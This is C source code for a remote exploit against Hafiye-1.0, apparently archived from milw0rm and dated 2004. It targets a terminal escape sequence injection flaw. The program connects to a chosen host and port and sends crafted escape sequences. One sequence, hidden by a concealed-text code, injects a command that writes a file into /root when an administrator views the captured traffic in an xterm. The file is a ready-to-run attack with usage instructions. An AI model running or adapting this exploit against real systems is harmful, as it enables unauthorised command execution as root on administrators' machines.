/* Remote Exploit for Hafiye-1.0
** Terminal Escape Sequence Injection Vulnerability
** Written by Serkan Akpolat
** Homepage: http://deicide.siyahsapka.org
** E-mail: deicide siyahsapka org
** Greets: Virulent, gorny and all other netricians
*/
#include <stdio.h>
#include <sys/types.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdlib.h>

typedef struct _target {
char *host;
u_short port;
unsigned int sequence;
unsigned int cnt;
} target;

char *esc_sequence[]= {"Escape Sequences",
"\x1b""]2;Insecure?""\x07\x0a",
"\x07\x07\x07\x07\x07\x07",
"\x1b""]2;;echo Owned > /root/Owned.txt"
"\x07\x1b""[21t""\x1b""]2;xterm""\x07"
"Abnormal Termination""\x1b"
"[8m;""\x0a"};


char use[] ="\t[ -h host ] [ -p port ] [ -e esc-seq-n ] [ -l number ]\n"
"\t Escape Sequences :\n"
"\t1-Change TitleBar Text to \"Insecure?\"\n"
"\t2-Ring The Bell\n"
"\t3-Hidden Prompt to Create Owned.txt in /root\n"
"\tExample: ./exp -h 192.168.0.3 -p 80 -e 1 -l 1\n";

void usage()
{
printf("%s",use);
exit(1);
}

int connect_to_host(char *host, u_short port)
{
int sock = 0;
struct hostent *hp;
struct sockaddr_in sa;

memset(&sa, 0, sizeof(sa));

hp = gethostbyname(host);
if (hp == NULL) {
herror("Error:");
exit(1);
}
sa.sin_family = AF_INET;
sa.sin_port = htons(port);
sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

sock = socket(AF_INET, SOCK_STREAM, 0);
if (sock < 0)
exit(1);

if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
exit(1);

printf("[+] Connected to %s\n", host);
return sock;
}

int main(int argc, char **argv)
{
int i;
int sock = 0;
char buf[256]="\0";
target target;
memset(&target,0,sizeof(target));
while ((i = getopt(argc, argv, "h:p:e:l:")) != -1) {
switch (i) {
case 'h':
target.host = optarg;
break;
case 'p':
target.port = (u_short)atoi(optarg);
break;
case 'e':
target.sequence = atoi(optarg);
if(target.sequence < 1 || target.sequence > 3) {
usage();
}
break;
case 'l':
target.cnt=atoi(optarg);
if(target.cnt<1) {
target.cnt=1;
}
break;
case ':':
case '?':
default:
usage();
exit(1);
}
}
if (optind != argc || !target.host || !target.port ||
!target.sequence || !target.cnt) {
usage();
}

sock = connect_to_host(target.host, target.port);
strncpy(buf,esc_sequence[target.sequence],sizeof(buf)-1);


printf("[+] Sending Escape Sequences\n");
do {
if (send(sock, buf, strlen(buf), 0) < 0) {
printf("Socket Error\n");
exit(1);
}
target.cnt--;
} while(target.cnt > 0);
close(sock);
return 0;
}

// milw0rm.com [2004-08-25]
